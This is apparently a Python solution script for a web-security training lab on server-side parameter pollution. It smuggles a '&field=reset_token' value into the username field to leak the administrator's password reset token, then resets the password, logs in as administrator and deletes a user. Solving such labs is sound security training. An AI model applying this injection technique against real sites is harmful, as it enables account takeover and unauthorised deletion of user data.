######################################################################
#
# Lab: Exploiting server-side parameter pollution in a query string
#
# Hack Steps:
#      1. Fetch the forgot password page
#      2. Extract the csrf token and session cookie
#      3. Make a forgot-password request for administrator
#      4. Get the reset token
#      5. Reset password for administrator
#      6. Login as administrator
#      7. Delete carlos from the admin panel
#
######################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0af5003804c3737281325cea002b0099.web-security-academy.net"

NEW_ADMIN_PASSWORD = "Hacked" # You can change this to what you want

def main():
    print(Fore.WHITE + "â¦—1â¦˜ Fetching the forgot-password page.. ", end="", flush=True)

    forgot_password_page = fetch("/forgot-password")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = forgot_password_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", forgot_password_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Making a forgot-password request for administrator.. ", end="", flush=True)

    data = { "username": "administrator", "csrf": csrf_token }
    cookies = { "session": session }
    post_data("/forgot-password", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—4â¦˜ Getting the reset token.. ", end="", flush=True)
    
    data = { "username": "administrator&field=reset_token", "csrf": csrf_token }
    cookies = { "session": session }
    fetching_result = post_data("/forgot-password", data, cookies)
    restet_token = re.findall("\"result\":\"(\w*)\"", fetching_result.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + restet_token)
    print(Fore.WHITE + "â¦—5â¦˜ Reseting password for administrator.. ", end="", flush=True)

    data = { "reset_token": restet_token, "csrf": csrf_token, "new-password-1": NEW_ADMIN_PASSWORD, "new-password-2": NEW_ADMIN_PASSWORD }
    cookies = { "session": session }
    post_data("/forgot-password", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—6â¦˜ Logging in as administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": NEW_ADMIN_PASSWORD, "csrf": csrf_token }
    admin_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—7â¦˜ Deleting carlos from the admin panel.. ", end="", flush=True)
    
    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/admin/delete?username=carlos", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")


if __name__ == "__main__":
    main()